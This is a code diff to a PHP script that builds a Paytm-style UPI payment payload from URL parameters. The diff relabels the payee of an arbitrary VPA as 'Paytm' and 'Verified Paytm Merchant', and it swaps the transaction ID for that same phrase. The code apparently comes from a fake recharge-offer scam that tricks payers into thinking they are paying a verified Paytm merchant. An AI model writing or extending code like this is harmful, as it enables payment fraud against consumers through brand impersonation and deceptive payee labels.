@@ -4,13 +4,13 @@ header('Cache-Control: no-store, no-cache, must-revalidate');
 header('Access-Control-Allow-Origin: *');
 
 $amount = isset($_GET['amount']) ? $_GET['amount'] : '349.00';
-$text = isset($_GET['text']) ? $_GET['text'] : 'Recharge';
+$text = isset($_GET['text']) ? $_GET['text'] : 'Verified Paytm Merchant';
 $mobile = isset($_GET['mobile']) ? $_GET['mobile'] : '9876543210';
 $vpa = isset($_GET['vpa']) && !empty($_GET['vpa']) ? $_GET['vpa'] : 'paytmqr6udcnp@ptys';
-$name = 'Recharge Offers';
+$name = 'Paytm';
 
 $amountInPaise = round(floatval($amount) * 100);
-$txn = 'TXN-' . rand(100000000000, 999999999999);
+$txn = 'Verified Paytm Merchant';
 
 $payload = [
     'p2pPaymentCheckoutParams' => [
